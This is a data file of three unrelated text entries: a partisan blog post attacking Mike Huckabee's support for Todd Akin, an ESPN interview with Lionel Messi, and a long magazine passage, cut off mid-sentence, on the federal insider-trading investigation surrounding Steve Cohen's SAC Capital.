  "latent_23283": "Can you imagine the indignant howls of Fox News outrage if an MSNBC or CNN host actively campaigned for a Democrat? It would be denounced as blatant media bias. Meanwhile, Fox's Mike Huckabee is out stumping for a Republican man who thinks that if a woman is impregnated by her rapist, her magic spermicide isn't working and she clearly was complicit in this non \"legitimate\" rape. But this kind of thing isn't a problem for Mike Huckabee who, while campaigning for Republicans, has found the time to cut a TV ad in support of Todd Akin whom he praises as a \"good man with a Christian heart.\"\n\nThis good Christian man is the same dude who, with Paul Ryan ,sought to redefine rape and who was arrested three times, in the 80's, for occupying an abortion clinic. So in addition to partisanship, we're talking some serious extremism here. But while the reality based community was appalled at Akin's \"legitimate rape\" comment, Huckabee feels that it's no big deal because it was just a mistake that many politicians make. According to Mike, \"You know Todd Aiken made a verbal gaffe that all of us have made at some point or another you see the presidential candidates do it. Obama's done it, Joe Biden's, my gosh, he's a gaff-o-matic.\"\n\nNice \"tu quoque\" spin here but Biden's \"gaffes\" are very different from being ignorant of biology. In Akin's case, he obviously believed that women are incapable of being impregnated by a \"legitimate rape.\" That's not a gaffe. It's based on a belief system that reflects a very demeaning attitude towards women - an attitude that seems to pervade today's Republican men with Christian hearts.\n\nBut seriously, do you think the Fox talkers would be silent if a librul media person were this political?",
  "latent_23449": "The day after he helped Barcelona move closer to winning La Liga by beating Espanyol 5-0, Lionel Messi spoke exclusively to ESPN's Quique Wolff. For more on Messi, click here.\n\nThis interview was conducted in Spanish and then translated into English. It has been edited for brevity and clarity.\n\nQuique Wolff: A lot of time has passed since we first interviewed you wearing that Lanus hat. All your dreams have come true, no?\n\nLionel Messi: A lot of time has passed since then! Luckily there have been a lot of happy moments, but some not so happy as is normal in football. But overall, I am very happy with what has been won so far. And especially for the club; when one has won more titles than one ever expected, it is good. As for the national team, we have been to so many finals and haven't been able to win a title so I still haven't been able to get that off my back, but that is football.\n\nWolff: There is just one game to determine whether Barcelona win La Liga and the fate is, luckily, in the club's hands.\n\nMessi: Yes, luckily we have been able to get several points ahead. We suffered a dip at a time when we least expected it, after the international break, we had [Real] Madrid and then the qualifier against Atletico Madrid and then consecutive games in La Liga where we dropped many points. Luckily we counted on ourselves and now we are back on top.\n\nWolff: Is that the key, when the club get together and become strong and say: 'Guys we have to depend on ourselves?'\n\nMessi: Yes, luckily we caught that in time and banded together. The truth is the elimination by Atletico Madrid in the Champions League was tough. We had been far superior in the first leg and we could have defined the qualifier, but the way we left it and then having to play there, well, that was very difficult. Because Atletico Madrid do what they do very well and that made it more complicated.\n\nWolff: Would you like to see Atletico Madrid win the Champions League?\n\nMessi: Always for Barcelona, the fans don't want to see Real Madrid win anything, as they also feel toward us. But in the end it is a final that they made it to again and for us, we just need to focus on what we can win. We have two finals left, and it would be great to end the season winning them both. It also would have been great to have been in the Champions League final but it wasn't to be. So winning two of three would be spectacular.\n\nWolff: Playing against a Diego Simeone team, it is difficult, no?\n\nMessi: They are a team very uncomfortable to play against. And [Simeone] deserves much merit for what he has done and made his players believe in him and do things perfectly because he has been at this for a while now. Apart from this he has very good players and reserves, who also come in and do the job when they get a chance.\n\nLionel Messi is chasing a league and cup double with Barcelona and will play for Argentina at the Copa America Centenario.\n\nWolff: Regarding your goal on Sunday, people think this is all just luck but the truth is that you have been working on this all your life, this thing of the free kicks.\n\nMessi: Yes, the truth is that we train for this; we work on how to move so that the ball goes to the right place and also you learn things over the course of your career.\n\nWolff: Now you have the goalkeepers confused because they aren't sure whether you are hitting the ball toward their post or over the wall. That plants doubt in the minds of the goalkeepers and gives you a little advantage, isn't that right?\n\nMessi: Yes. To be honest, I like to hit the ball over the players' wall but from time to time I like to mix it up a little bit so that the goalkeeper doesn't know where I'm going and I want to keep him confused until I kick. I think for that reason I like to keep the goalkeeper in doubt.\n\nWolff: Copa America Centenario -- a new illusion?\n\nMessi: It is a new Copa, different. Very nice in the United States and very different from what I have played before because of the people, the stadiums. That will make it different and for us, a new chance.\n\nWolff: Olympics? You would have liked to play, I bet?\n\nMessi: I would have liked to go because it was a spectacular experience for me to play in the (2008) Olympics, just as it was for the (2005) U20 World Cup. Not just because we won, but for the experience I gained. It was a great experience to stay in the Olympic Village and meet other elite athletes from other sports and to be just another athlete among them; that was very spectacular even though we didn't spend a lot of time in the village.\n\nWolff: All athletes say that Olympics are special.\n\nMessi: Yes, World Cup is great but Olympics are something special.\n\nWolff: Does it bother you to have made it to the World Cup final and not won? And then all the media buzz.\n\nMessi: Well, that always happens. I am used to it. But yes, we made it to the final. It isn't like we only made it to the second round, we made it to the final and that is not easy. I have said this in other interviews: It is not easy. We were very close and we lost to Germany, a great national team with great players and they just got past us. Just like the Copa America, the loss came down to the details, we lost [vs. Chile in 2015] in penalty kicks. But to say that the media wanted to destroy me, I'm over that.\n\nWolff: You have Five Ballons d'Or! Five!\n\nMessi: I never would have imagined that. As I told you everything I have won in my career was more than I ever dreamed in my life. The titles in group are very important to me but these [Ballons d'Or] are also very special.",

  "latent_23700": "THAR SHE BLOWS Steve Cohen has become a focal point of a seven-year probe into insider trading, led by U.S. Attorney Preet Bharara. So far, 71 people have been convicted or admitted guilt. Download this image as a desktop wallpaper.\n\nTwenty-five years ago Wall Street, and much of America, was transfixed by a sweeping set of insider-trading investigations centered on the greatest financier of the age, junk-bond king Michael Milken, of Drexel Burnham Lambert. Day after day, week after week, month after month, stories of U.S. Attorney Rudolph Giuliani’s relentless investigation dribbled out to the press. One by one, Giuliani picked off Milken’s minions, confronting them at their homes, handcuffing them at their offices, pulling them before secret grand juries, indicting a few, pressing for evidence that Milken had broken the law. It all took on an inexorable quality. In their hearts, most everyone knew that Milken was going down sooner or later—and he did, paying more than $1 billion in fines and spending 22 months in prison. He was banned for life from the securities industry, and his firm was dismantled. Twenty-five years later it’s all happening again. Once more a relentless U.S. attorney, this time 44-year-old Preet Bharara, has seemingly targeted the billionaire investor Steve Cohen, founder of SAC Capital Advisors, the $14 billion hedge fund based in Stamford, Connecticut. One by one, Bharara has picked off onetime SAC traders and analysts, confronting them at their homes, pulling them before grand juries, bringing criminal cases, and pressing them for evidence that Cohen has broken insider-trading laws. So far Cohen has not been charged with anything, but there is the same sense that Bharara, like Giuliani before him, has too much invested in all this to lose. “If Steve Cohen gets off,” one hedge-fund manager observes, “he will be the O. J. Simpson of insider trading.” In almost every way, though, today’s scandal surpasses the one that brought the Roaring 80s to an end. There have been more arrests, many more convictions; C.E.O.’s have fallen, lives and companies have been ruined, all in a campaign that has increasingly put one man in the government’s crosshairs: Steve Cohen, thought to be the most brilliant trader of his generation. Simply reading the headlines this spring, one could be forgiven for being a bit confused. In mid-March, after years of scoffing at every suggestion any of its traders might have done something untoward, SAC agreed to pay, without admitting guilt, the largest fine in the history of the Securities and Exchange Commission, a stunning $616 million, to settle charges of insider trading in only two trades. Some on Wall Street called it a victory for Cohen, who paid a pittance—for him—to make a messy situation go away. Others were not so sanguine, observing—correctly—that blood was finally in the water, that an S.E.C. fine did nothing to curtail the ongoing criminal investigation, which has already led to guilty pleas from and convictions of at least five onetime SAC employees. Cohen seems determined to ride it all out with sheer bravado. A week after the settlement, news broke that he had paid the casino owner Steve Wynn an astounding $155 million—a record sum for a U.S. collector—to buy Picasso’s Le Rêve (which Wynn had accidentally put his elbow through in 2006). Days after that revelation Cohen paid $60 million for a 10,000-square-foot, seven-bedroom mansion with ocean views, on Further Lane in East Hampton. Taken together, it all had a “Let them eat cake” quality, as if Cohen were waving his billions in the government’s face, daring it take him on. Their looming showdown draws on themes of money, privilege, and class that define the era. Steve Cohen isn’t just another hedge-fund billionaire; he is the hedge-fund billionaire. He doesn’t live in just another Greenwich, Connecticut, mansion; he lives in the largest of them all, complete with its own two-hole golf course and Jeff Koons’s Balloon Dog sculpture adorning the driveway. Inside, the walls are festooned with paintings from his fabled collection of Impressionist and contemporary art, which includes Francis Bacon’s Screaming Pope, hanging just outside his bedroom. Doughy and clerk-like, Cohen is nevertheless the Gatsby of our age, a middle-class kid from Long Island who caught the gambling bug fleecing his high-school pals in all-night poker games. Today he tosses around his winnings in transparent attempts to join the social elite that’s never quite accepted him and his 48-year-old Puerto Rican second wife, Alex, whom he met through a dating service.\n\nOn Wall Street everyone knows the Cohen legend. The awkward kid who stood outside Merrill Lynch offices in college studying the green digital stock prices as they slid silently across screens in the window, finally deducing patterns no one else could see. The years as a wunderkind at little Gruntal & Co. during the 1980s, screaming at assistants who couldn’t keep up with his flood of trading orders. Then came the formation of SAC at the dawn of the hedge-fund age, in 1992, its returns so enormous Cohen could demand as much as double the industry average 1.5 percent management fee and take 50 percent of investment gains, as opposed to the usual 20 percent. The jaw-dropping 70 percent returns he piled up riding the high-tech wave of 1998–99, then the even more mind-boggling 70 percent he earned betting against the very same stocks in 2000, inspired BusinessWeek to crown him “The Most Powerful Trader on Wall Street You’ve Never Heard Of.” Cohen never wanted the attention, even after buying his Greenwich mansion and moving SAC into its new brick-and-glass headquarters on Long Island Sound. Taking a page from Milken’s book, he bought the copyright to photographs of himself—so the press couldn’t run them. He dodged reporters for years, until SAC’s name began popping up in stories about this new insider-trading investigation, at which point, in 2010, he sat for a series of exclusive interviews with Vanity Fair. “I feel like Don Quixote fighting windmills,” he groused. “There’s a perception, and I’m trying to fight that perception. I find it offensive that they lump SAC into these articles. I really do. The press, I mean, they don’t understand what the hell—they don’t understand what they’re writing about.” Yet even Cohen would admit that this “perception”—that SAC had to be doing something illegal to make such astounding returns—had been around for a while. In the 1990s, SAC earned a reputation for pumping brokerages for advance notice of analyst recommendations, a rumor that was never proved. In the early 2000s it was known as a fund that hoovered up all available information on every conceivable stock, to the point where some of it crossed the line into illegal insider information, another suspicion that was never proved. In response Cohen beefed up SAC’s compliance department (its internal police) and began hiring a new breed of trader. The stereotypical Wall Street trader, the hard-charging, foulmouthed kid from Staten Island, began to disappear from SAC’s halls; in his place came Ph.D.’s from Harvard and Stanford, traders always referred to as “super-smart,” who took jobs at SAC over offers from Google or Microsoft. In his interviews with Vanity Fair, Cohen all but admitted SAC had once steered too close to legal boundaries, necessitating a change in its culture. “Things were different then,” he acknowledged. “This was a learning process.”\n\nBut the whispers about Cohen continued to spread as SAC grew to become one of the world’s largest hedge funds, with $14 billion under management. What you’ll hear from SAC’s supporters or Cohen’s friends is that of course the government is trying to get Steve Cohen. Why? Well, anyone who has earned those kind of returns, who charges the highest fees in the industry, who is personally worth over $10 billion, and who has done all that by trading, well, he must be using inside information to be that good, that rich. No doubt some of the whispering is fueled by envy, as well as personal distaste—Cohen, people who know him say, can turn nasty on a dime—but SAC courted it by assembling what is by any measure one of Wall Street’s greatest information-gathering machines. It’s fueled, many believe, by the exorbitant fees SAC pays scores of Wall Street firms for processing its trades and other services; whereas other hedge funds trade via computer at fractions of a penny per share, SAC still does it the old-fashioned way, paying three to five cents, making it, by wide agreement, the largest payer of fees on Wall Street, $400 million a year by some estimates. That kind of largesse, some charge, spurs a blizzard of tips from Wall Streeters eager to ingratiate themselves with Cohen. In addition, former SAC employees have started at least 31 other funds, in which Cohen often invests, and the expectation is that the former traders will continue to feed SAC information, which is why one SAC alumnus calls Cohen “the Godfather.” At one point, in 2008, Cohen was so proud of his information-gathering techniques that an SAC marketing document summarized his trading strategy with one word: “Edge.” But when asked about this in a 2011 civil-suit deposition, Cohen said, “I hate that word.” What makes the rumors linger is SAC’s business structure. Splayed before five screens at his workstation on SAC’s library-quiet trading floor, Cohen himself manages only about $2 billion of the firm’s capital; the rest is handled by a hundred or so portfolio managers, known as P.M.’s, each of whom leads a small team, usually of two or three analysts, known as a “pod.” They can always see Cohen, thanks to the “Steve Cam,” a tiny camera trained on the boss sitting at his 50-foot black desk, divided into eight trading stations. SAC is a notoriously cutthroat environment; those who don’t perform don’t last. Each pod typically manages hundreds of millions—although some manage more—and is required to pass its best ideas to Cohen, usually at a Sunday-night teleconference; if Cohen makes money off the idea—a process known inside SAC as “centerbooking” or getting “tagged”—the pod members receive a 4 percent cut. There’s a high hurdle, though: when asked in the deposition what the threshold for a good idea was, Cohen responded, “You don’t want to hear an idea that you’re going to make 5 percent in a year on. I don’t think anyone would embarrass himself by bringing me an idea like that.” Those who believe SAC has, at least in the past, trafficked in dirty information, including onetime SAC traders who spoke to Vanity Fair on background, say this high-pressure structure spurs desperate P.M.’s to resort to the use of inside information—and combined with the potential to make a fortune, this can lead to temptation. And where there’s temptation, of course, people will cross the line. As a former SAC analyst puts it, “What happens if the puppet master doesn’t want you to have a moral compass?”\n\nThe very same structure, however, tends to insulate Cohen, who can say he doesn’t know the sources of information behind his traders’ tips. “Steve knows his business model protects him,” says the former SAC analyst. “There’s not a single hedge fund that hasn’t somewhere, sometime, gotten sketchy info. But this is different. You think Steve wants you to have inside information but doesn’t want to know you do. Why do it? Why did A-Rod take steroids? Because it’s worth it.... The payout is huge and you can get swayed. What would you do for, say, 20 percent of $276 million? You do stuff. You fucking do stuff. You can’t be in this job without navigating a gray line constantly.” Tom Conheeney, SAC’s president, counters that it is “absolutely false” to say that the business model is designed to protect Cohen. “The structure has nothing to do with ‘insulating’ Steve,” he says. “We believe the multi-manager model is the best model to produce attractive, risk-adjusted returns over time.” “Activity that was acceptable no longer is. Steve made the appropriate adjustment,” says Anthony Scaramucci, an SAC investor, who runs SkyBridge Capital. “The government has had years to prove its case. If they could, they would have done it by now.” Many of the safeguards came after the S.E.C. initiated the current insider-trading investigation, in 2006. That year, for instance, SAC instituted a rule forbidding any P.M. from using a so-called expert network—a company that provides industry “experts” to help traders analyze stocks—that talked directly to company insiders. SAC says it was also one of the first hedge funds to establish a separate compliance department led by a well-respected professional, and it has steadily strengthened its compliance program over time, increasing its total compliance personnel from 3 in 2005 to 36 today. Shot Across the Bow\n\nThe legal waves lapping at Steve Cohen’s feet today spread from the dropping of a single pebble into regulatory waters almost seven years ago, on August 22, 2006, a hot, hazy summer afternoon in Lower Manhattan. It was then, according to The Billionaire’s Apprentice, the excellent new book by Anita Raghavan, of the New York Times Dealbook site, that a lawyer named John Moon walked into the S.E.C.’s New York regional office at the World Financial Center with suspicions about a client’s trades. Moon worked for the giant Swiss bank UBS, which processed trading for any number of hedge funds, large and small. A month earlier one of its newest and smallest clients—a fund called Sedna Capital Management—had embarked on an incredible run of success, nearly doubling its $2 million in capital with barely a handful of trades. Moon suspected Sedna was benefiting from “cherry-picking,” an age-old Wall Street scheme in which a fund manager allocates his most profitable trades to a friend or relative, in this case Sedna, in order to avoid scrutiny. When S.E.C. attorneys Googled Sedna, they realized they might be onto something big. It was run by Rengan Rajaratnam, whose older brother, a rotund Sri Lankan named Raj Rajaratnam, headed one of the world’s largest and most successful hedge funds, the $7 billion Galleon Group. The S.E.C. began examining Raj’s trades. Soon federal prosecutors and two teams of F.B.I. agents in New York were on the case. In time the overall investigation came under the supervision of Preet Bharara, the politically ambitious U.S. attorney for the Southern District of New York. Born in India, Bharara came to the United States when he was two years old. After graduating magna cum laude from Harvard, he attended Columbia Law School and eventually joined the organized-crime unit of the Southern District, where he helped bust up New York’s Colombo and Gambino crime families. Next he worked for New York senator Chuck Schumer, who got him the job as U.S. attorney. Federal investigators discovered that Raj Rajaratnam sat at the center of a vast insider-trading network stretching from New York to Taiwan. It took three long years of subpoenas, wiretaps, and grand juries, but once Rajaratnam himself was hauled away in handcuffs, in October 2009, many of his partners in crime became familiar names on Wall Street, their taut faces appearing regularly on CNBC. There was Roomy Khan, a chatty Silicon Valley trader infamous for allegedly “enslaving” one of her maids. And Danielle Chiesi, a fading beauty queen who gleefully fed tips to Rajaratnam. Most infamous of all was Rajat K. Gupta, a Goldman Sachs board member and former C.E.O. of the global consulting giant McKinsey & Company, who was convicted of funneling tips to Rajaratnam about deliberations inside the vaunted Goldman boardroom itself. In the three and a half years since Rajaratnam’s arrest, federal prosecutors have charged 77 people with securities-law violations, most of them insider trading; 71 have pleaded guilty or been convicted. SAC’s name popped up in the early months of the Galleon investigation, all the way back in 2007, according to Bloomberg.com, when F.B.I. agents successfully “flipped” a now infamous Wall Street trader named David Slaine, who provided prosecutors with several examples of what he believed to be insider trading at SAC. During 2008 the names of former SAC traders began appearing on government wiretaps. The investigation worked like this: if someone was overheard swapping inside information with, say, Roomy Khan or Danielle Chiesi, there was a good chance his phone would be tapped. Traders who were overheard actively swapping inside information—call them “big fish”—might be marked for prosecution. But “little fish,” it appears, were often seen to be most valuable as potential informants. Between January and April 2009, F.B.I. teams led by agents David Makol and B. J. Kang approached three of these little fish, confronted them with evidence of their own wrongdoing, and easily gained their cooperation. In doing so they moved the investigation away from Galleon and toward a group of new targets, including SAC. The first of the little fish was an unemployed 35-year-old named Wesley Wang, the son of Chinese immigrants. In November 2008 investigators received the go-ahead to place taps on Wang’s phones. A more unlikely “Patient Zero” for the SAC case would be hard to imagine. When the F.B.I. came calling, he hadn’t worked at a hedge fund for months. “Wes,” sighs someone who knows him well, “was a schlub.” After dropping out of the University of California, Berkeley, he worked at three hedge funds: Whitman Capital; Sigma Capital, an affiliate of SAC; and Trellus Management, where he was employed until September 2008. Court filings say Wang knew little about finance and got through the hedge-fund doors only because he was fluent in Mandarin, which made him useful in translating data on Chinese companies. To stay inside, he admitted to the F.B.I., he had resorted to passing inside information. An F.B.I. agent approached Wang on January 7, 2009, and he agreed to cooperate within a week. If Wes Wang was a mediocre analyst, he proved to be a superstar informant, naming at least 20 people he believed were involved in insider trading. Prosecutors would eventually gush that Wang “was the key witness that was able to open the door to literally dozens of other witnesses.” He provided “the government with answers to questions it did not even know to ask,” a prosecutor told a court in early 2013. “He has provided so much information that the government has not yet been able to investigate all of it for want of manpower.” What little detail is available on Wang’s illegal exploits suggests he was alternately resourceful and a bit pathetic. In one job he boasted that he had an excellent source inside the Target department-store chain; it turned out to be an assistant store manager in Oakland whose tips were, as might be expected, useless. Apparently Wang had better success chatting up a neighbor, a Cisco Systems executive, whose information he was able to trade to others. Among those Wang named was his onetime boss, Doug Whitman, of Whitman Capital, about whom he testified at a three-week trial last summer; Whitman was eventually sentenced to two years in prison.\n\nBut perhaps the most useful source Wang led the F.B.I. to was a man he had once worked for as a college intern, Karl Motey. Motey, who was then 44, had been a respected Silicon Valley semiconductor analyst for years before opening his own small firm, the Coda Group, in Los Altos, California. Some of the insights he fed his hedge-fund clients, however, crossed the line into inside information, as Motey revealed to Wes Wang one day in February 2009. What Motey didn’t know was that Wang was wearing a wire. Two months later F.B.I. agent Makol walked up to Motey in the parking lot of his gym, where Motey had just finished a workout. The two repaired to a coffee shop where, when confronted, Motey quickly admitted his guilt and agreed to cooperate. Inside a week he was on a plane to New York, where prosecutors briefed him on their unusual plan: Motey was to be the first government informant inserted into the strange world of “expert networks.” These companies—about 40 existed in 2009—had begun springing up after the S.E.C. in 2000 issued the Regulation Fair Disclosure rule, known as “Reg F.D.,” which mandated that public companies issue “market-moving” information to all investors at the same time. Until Reg F.D., many companies had given select analysts advance notice of upcoming earnings in private conference calls. Once companies clammed up, hedge funds and other big investors were obliged to do more of their own detective work. Expert-network firms rose to fill the vacuum. On paper, they connected traders with outside “experts” who could offer insights about a given company; in practice, investigators suspected, these insights often amounted to inside information. Early on, they decided to focus on a single expert-network company in Silicon Valley: Primary Global Research, known as P.G.R., which had a reputation for passing information of borderline legality. The F.B.I. instructed Karl Motey to telephone P.G.R. consultants, tell them he was setting up a new hedge fund, and secure their services. It worked like a charm. Thanks in large part to Motey, in the fall of 2009 the government was able to ask a judge for a wiretap on the phone lines used by P.G.R. and almost 100 of its clients. That allowed the government to compile cases on at least 10 people, including P.G.R. consultants and their sources of illegal information at several companies, such as Dell. Roughly one of every eight convictions in the Galleon-SAC probe, in other words, was the result of Motey’s work. “Look at the minnows who ended up swallowing the sharks,” someone close to the case observes. “Motey is Moby Dick. Anything that gets close to him, he traps and eviscerates.” A Hindu, a Jew, and a Catholic Walk into a Hedge Fund . . .\n\nBut Karl Motey did more than simply bring down P.G.R. More than any other single informant to that point, he brought the government within striking distance of SAC. In this he was joined by another of the government’s Bay Area informants, a savvy 53-year-old Malaysian named Richard Choo-Beng Lee, known as “C.B.,” who had been a high-tech analyst for several funds, including SAC, before starting his own Silicon Valley-based fund. His new partner, Ali Far, however, had previously worked closely with Raj Rajaratnam at Galleon, and when investigators overheard the two swapping tips they confronted both Lee and Far. Both agreed to cooperate. Lee pointed the government toward another very senior ex-SAC trader. After he left SAC, Lee worked briefly for a hedge fund called Stratix, which was co-founded by Rich Grodin, who had joined SAC in the very early years—so if anyone could help the government understand the firm’s culture, it would be he. (Cohen invested in Stratix, which closed in late 2007.) Grodin’s calls with Lee were among those being wiretapped, according to a government filing. In the fall of 2009, Grodin abruptly closed down his second hedge fund, Quadrum, although he was never charged. Wall Street insiders wonder if this means he may be cooperating with the government. Lee was less successful when F.B.I. agents, in hopes of planting a mole inside SAC, had him contact the company in a vain attempt to get a job there. In his deposition, Cohen admitted that SAC had rejected Lee “because we were suspicious of his intentions [We] had heard rumors he was wearing a wire.” The wiretaps on P.G.R., which the government secured mainly with the help of the reliable Karl Motey, helped raise the blinds on two other insider-trading rings, which led to both SAC alumni and even a current, high-level SAC trader. The first centered on a pair of former SAC traders who were best friends, Noah Freeman and Donald Longueuil, along with a third man, Samir Barai, who ran his own fund, Barai Capital Management, in New York. Freeman and Longueuil, along with their fiancées, were active athletes, participating in triathlons and cycling events together. The three were so close that Longueuil served as best man at Freeman’s 2009 wedding, and Freeman promised to serve as Longueuil’s best man at a wedding that was scheduled to take place in February 2011 but never would. Barai, Freeman, and Longueuil—who jokingly called themselves the Hindu, the Jew, and the Catholic—had been gathering, swapping, and trading on inside information since at least 2006, when they were all at other firms. They called their exchanges “data dumps” or “data smackdowns,” and Barai later told the F.B.I. that they’d mark them on their calendars as a “threesome” or as “don, sam, noah—sex.” They continued once Freeman and Longueuil joined SAC, in 2008, Freeman in the Boston office, Longueuil in New York. The trio developed a series of valuable sources who had contacts inside several tech companies. One, Freeman later told the F.B.I., was a consultant named Doug Munro, who ran a research firm called Worldwide Market Research and, according to both Freeman and Barai, had inside information on Cisco. Munro, they said, had an e-mail account called juicylucy_xxx@yahoo.com, and he’d send Barai an e-mail saying “lucy is wet” when he was supposed to check the account for new information. (Munro has not been charged.) But the trio’s best source was a consultant at P.G.R. named Winnie Jiau, whom they nicknamed Winnie the Pooh. She had valuable—and illegal—sources of her own, and they paid Jiau as much as $10,000 a month as well as pelting her with little gifts, from lobsters to gift certificates for the Cheesecake Factory restaurant chain. (At one point Freeman e-mailed his secretary, “Can you please send (12) lobsters to Winnie? I know you hate her but we have to do this.” His secretary replied, “Sure thing. I hope she gets sick from the lobsters.” The secretary didn’t get her wish, because the lobsters didn’t get picked up when they arrived. “Typical Winnie to leave 12 lobsters to die at FedEx,” the secretary wrote in a follow-up e-mail. “She has no heart.”) The Freeman circle began to fall apart in 2010, when first Freeman and then Longueuil were fired by SAC for poor performance. Longueuil kept trading on his own while Freeman fled Wall Street altogether, taking a job teaching economics at the Winsor School, a prestigious all-girls academy outside Boston. The real blow, however, came on the evening of November 19, 2010, when The Wall Street Journal published online a lengthy story describing how the government investigation was beginning to focus on P.G.R. At his New York apartment, Longueuil panicked. That night, he used two pairs of pliers to tear apart a flash drive and two computer hard drives where he had stored his illegal information. He then slid the components into four ziplock bags, and a little before two A.M. he left his building and spent the next 40 minutes walking behind garbage trucks, throwing each of the little bags in the back of a different truck. It was too late. The weak link in the Freeman circle turned out to be one of Samir Barai’s assistants, a young man named Jason Pflaum. Because Barai was hearing-impaired, Pflaum handled many of his calls, and, as luck would have it, some were with P.G.R. experts who were being listened to by investigators on the Motey-enabled wiretaps. Confronted by investigators a month before the Journal story ran, Pflaum had given up everyone, even leading the F.B.I. to audiotapes of incriminating calls with Winnie Jiau. After reading the Journal’s article, Barai texted Pflaum. “Problem is this scope is said to focus on the use of so-called expert network firms Fuuuuuuck.” He then told Pflaum: “Shred as much as u can.” Barai himself not only went into his office and began shredding, but also asked Pflaum to leave his laptop with his doorman so Barai could pick it up and delete its contents. Three weeks later, Noah Freeman walked into the Winsor School’s parking lot and found B. J. Kang, of the F.B.I., waiting for him. Within days Freeman too admitted everything and agreed to cooperate, becoming one of the government’s most valuable sources of information to that date. Not only did Freeman agree to secretly tape Longueuil incriminating himself—it was on a Freeman tape that investigators learned of Longueuil’s garbage-truck expedition—he also gave detailed debriefings on SAC and Cohen. He told Kang that insider trading in the hedge-fund business was “ubiquitous,” and said trafficking in corporate secrets was expected of him while at SAC. According to a memo Kang wrote his superiors, “Freeman and others at SAC Capital understood that providing Cohen with your best trading information involved providing Cohen with inside information Freeman pitched to Cohen many trading ideas over the 18 months he was at SAC Capital and some of the trading ideas involved dirty information.” (“Freeman’s assertion that portfolio managers were expected to pass on improper information is categorically wrong,” says the SAC president Conheeney. “I am confident that he didn’t believe this while he worked at SAC, and that he knew he wasn’t supposed to get, trade on, or share inside information. In fact, he testified under oath that he went to great lengths to hide his illegal behavior from us.”) Most everyone Freeman fingered is going to prison. Longueuil pleaded guilty and got two and a half years. After Freeman testified against Winnie Jiau, a jury gave her four years. Freeman himself is still awaiting sentencing but is hoping for no jail time because of his cooperation. Rule Number One: There Is No E-mail List\n\nThe second insider-trading ring Karl Motey helped uncover involved a huge, byzantine group of analysts and traders at a trio of hedge funds. This theater of the scandal sprang dramatically into view on Monday, November 22, 2010, three days after Donald Longueuil’s garbage-truck episode. That morning, just after the market opened, black unmarked cars assembled at a parking lot across the street from One Landmark Square, in Stamford, Connecticut, which was the home of a hedge fund named Diamondback Capital. About a dozen armed F.B.I. agents stormed in and began sweeping through both floors of the office. They did the same at two other hedge funds, Loch Capital, in Boston, and Level Global, in Manhattan. Both Diamondback and Level were multi-billion-dollar funds run by prominent ex-SAC people. Loch, run by twins Tim and Todd McSweeney, was a smaller, technology-stock-focused fund, but it was a big name in the tech world and had investments from firms such as Citigroup and AIG. The next day, SAC sent a letter to its investors, telling them that the government had issued “extraordinarily broad” subpoenas to a number of investment managers, including SAC, which said that the subpoenas “don’t shed much light on whom or what the government may be investigating.” The firm added, “Neither the subpoena nor any other information of which we are aware suggests that anyone at SAC has engaged in any wrongdoing.” SAC’s all-clear signal would turn out to be extremely premature. The raids were a shock to everyone on Wall Street, but the targets all seemed to make sense. At Loch, nervous investors had been yanking money from the fund, which once had more than $2 billion in assets, ever since the news broke that Steve Fortuna, co-founder of S2 Capital and a close friend of the McSweeneys’, had pleaded guilty to insider trading. At Diamondback, Richard Schimel, one of the founders, was married to Steve Cohen’s sister, Wendy. Diamondback was started by Schimel, along with two other people, Larry Sapanski and Chad Loweth, who had left SAC in 2005. The word on the street was that the parting had not been amicable, and Cohen had put no money into Diamondback—so, people speculated, who better to inform on Cohen than Schimel? Level Global also had close ties to SAC. The fund was founded in 2003 by David Ganek and his former analyst Anthony Chiasson, who had made their reputations at SAC. By the end of 2010 the fund had gained almost 90 percent since its launch, versus the S&P’s 27 percent, and also had more than $4 billion under management. But the speculation and gossip was mostly wrong. Indeed, although the trail through Diamondback and Level would end up reaching into the very high ranks of SAC, the route was not what anyone had expected. In fact, at Diamondback, the fund’s founders were not named on the search warrant, and the government would show no interest in them.\n\nUnbeknownst to the outside world at the time of the raids, two former analysts, one at Diamondback and one at Level Global, were the ones cooperating with the government. Spyridon “Sam” Adondakis, who worked at Level from 2006 to 2010, was approached in October 2010 by F.B.I. agents as he was leaving a lunch in Midtown Manhattan. They asked to speak to him in a nearby park, and they played a recording of him that they’d gotten from the P.G.R. wiretaps. (The government would later credit Motey with pointing them to Adondakis.) Adondakis, then in his early 30s, agreed to cooperate—and to record his friends. Among them was a guy named Jesse Tortora, who had started working for Diamondback in 2007 as an analyst for a technology-focused portfolio manager named Todd Newman. Tortora and Adondakis had become friends earlier in the decade when they both worked in San Francisco for a stock-research firm called the Prudential Equity Group, a division of the big insurance company. Adondakis later said about Tortora, “We shared all of the information that we got on pretty much everything.” The group gradually expanded to include several Prudential analysts and their friends: a former Dell employee named Sandeep “Sandy” Goyal and Fayad Abbasi, another analyst. Abbasi’s roommate in San Francisco was a technology analyst named Jon Horvath. Tortora also started talking to a client named Ron Dennis, a research analyst at the mutual-fund company Waddell & Reed. Eventually, both Dennis and Horvath got jobs as analysts for portfolio managers at SAC. Horvath worked for Mike Steinberg, who had joined SAC in the early years. In fact, Steinberg, who is reportedly close to Cohen, had worked for Rich Grodin. When Prudential closed down its equity-research unit, the rest of the group soon migrated to New York, too. Adondakis got a job at Level Global working as an analyst for Anthony Chiasson; he and Abbasi, who landed at the mutual-fund company Neuberger Berman, shared an apartment in Tribeca. Abbasi hired Goyal as an analyst. As for Tortora, he’d gotten to know the McSweeneys at Loch Capital, and they referred him to their friend Todd Newman, at Diamondback, which Tortora joined in the fall of 2007. This was a world where business relationships seem to have been indistinguishable from friendships. A defense lawyer later said about the group, “They traveled together, they partied together, they ate together, they drank together, they rented homes in the Hamptons together. They were very, very close.” In 2009, Tortora e-mailed a group that included Abbasi and Adondakis: “Rule number one about email list, there is no email list, fight club reference. [He was referring to the 1999 movie Fight Club, in which Brad Pitt says, “First rule of Fight Club is: you do not talk about Fight Club.”] Rule number two, only data points can be sent, no sarcastic comments. Enjoy. Your performance will now go up by 100 percent in 09 and your boss will love you. Game theory, look it up.” The group shared a lot of legitimate information, obtained by going to conferences and speaking with research analysts. But they also shared a lot of inside information. Tortora and Adondakis both got information from P.G.R. consultants. The group also had its tentacles into other big companies, including Dell and another technology company, Nvidia. Tortora later told a jury that Horvath had a contact at Sun Microsystems, and he passed that contact’s information along to the group. He also said that since Dennis preferred speaking on the phone to e-mail, “as a matter of practice, I would talk to Ron very frequently, maybe every other day.” When asked by a prosecutor, “Did Mr. Dennis provide you with confidential information during your time at Diamondback?,” Tortora responded simply, “He did.” (Dennis has not been charged with any wrongdoing.)\n\nThe information sharing, it seems, was a way of life in the high-stakes world of trading 